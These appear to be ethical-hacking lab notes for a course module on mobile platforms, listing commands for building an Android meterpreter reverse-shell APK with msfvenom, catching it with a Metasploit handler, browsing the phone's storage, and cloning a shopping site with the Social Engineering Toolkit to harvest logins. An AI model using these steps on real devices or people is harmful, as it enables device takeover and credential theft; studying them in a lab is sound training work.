@@ -1,0 +1,37 @@
+Module 17: Hacking Mobile Platforms
+
+Creating Binary Payloads using Kali Linux to Hack Android
+	In Android, root terminal: ip addr add 10.10.10.69/24 dev eth0
+	In Kali Linux, service postgresql start
+	msfvenom -l
+	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > Desktop/Backdoor.apk
+	Share Backdoor.apk using web server.
+	msfconsole
+	use exploit/multi/handler
+	show options
+	set payload android/meterpreter/reverse_tcp
+	set LHOST 10.10.10.11
+	show options (check listening port)
+	exploit -j -z
+	In Android, download Backdoor.apk & install.
+	In Kali Linux, session is created automatically, if not: sessions -i 1
+	sysinfo
+	ipconfig
+	pwd; cd /sdcard; pwd; ls
+	ps
+
+Harvesting User's Credentials Using the Social Engineering Toolkit
+	In Android, root terminal: ip addr add 10.10.10.69/24 dev eth0
+	In Kali Linux, Applications --> 08 - Exploitation Tools --> social engineering toolkit.
+	bleeding-edge repos - No
+	1 - Social-Engineering Attacks
+	2 - Website Attack Vectors
+	3 - Credential Harvester Attack Method
+	2 - Site Cloner
+	POST back in Harvester/Tabnabbing - IP of Kali Linux (10.10.10.11)
+	Enter the url to clone - http://www.goodshopping.com
+	Do you want to attempt to stop apache server? (Y/N) - Y
+	In Android, Access the cloned website.
+	Try logging in. Will be redirected to a Webpage not available page
+	In Kali Linux, setoolkit captures login credentials.
+	Check /usr/share/set/src/logs/harvester.log
